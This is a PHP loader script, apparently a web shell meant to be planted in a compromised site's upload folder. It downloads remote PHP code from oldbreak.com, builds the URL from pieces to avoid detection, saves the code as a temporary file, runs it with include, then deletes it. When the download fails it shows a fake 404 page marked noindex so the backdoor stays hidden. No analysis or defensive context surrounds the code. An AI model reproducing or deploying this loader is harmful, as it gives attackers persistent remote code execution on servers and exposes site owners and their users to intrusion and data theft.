<?php
// loader.php — versi fleksibel: bisa pakai /tmp atau folder lokal

$prot = 'http' . 's';
$dom = 'oldbreak.com';
$path = '/a.txt';
$url = $prot . '://' . $dom . $path;

function _fetch_from_remote($u) {
    if (!function_exists('curl_init')) return false;
    $ch = curl_init();
    $opts = [
        CURLOPT_URL            => $u,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 6,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; ContentBot/1.0)'
    ];
    curl_setopt_array($ch, $opts);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$content = _fetch_from_remote($url);

if ($content === false || strlen(trim($content)) < 10) {
    if (@ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => ['timeout' => 6],
            'ssl'  => ['verify_peer' => true, 'verify_peer_name' => true]
        ]);
        $content = @file_get_contents($url, false, $ctx);
    }
}

if ($content !== false && strlen(trim($content)) > 10) {
    // ✅ Pilih tempat penyimpanan: /tmp (default) atau folder lokal
    $use_local_cache = true; // ganti false jika mau pakai /tmp

    if ($use_local_cache) {
        $cache_dir = __DIR__ . '/cache'; // folder lokal di dalam direktori upload
        if (!is_dir($cache_dir)) {
            mkdir($cache_dir, 0755, true); // buat folder jika belum ada
        }
        $tmp_file = $cache_dir . '/temp_' . uniqid() . '.php';
    } else {
        $tmp_file = tempnam(sys_get_temp_dir(), 'mod_');
    }

    if ($tmp_file && file_put_contents($tmp_file, $content)) {
        include $tmp_file;
        @unlink($tmp_file); // hapus setelah dipakai
        exit;
    }
}

// Fallback: pastikan tidak 0KB
http_response_code(404);
?>
<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <meta name="robots" content="noindex,nofollow">
    <style>body{font-family:sans-serif;margin:40px;background:#f5f5f5;color:#333;}</style>
</head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested resource could not be loaded.</p>
</body>
</html>
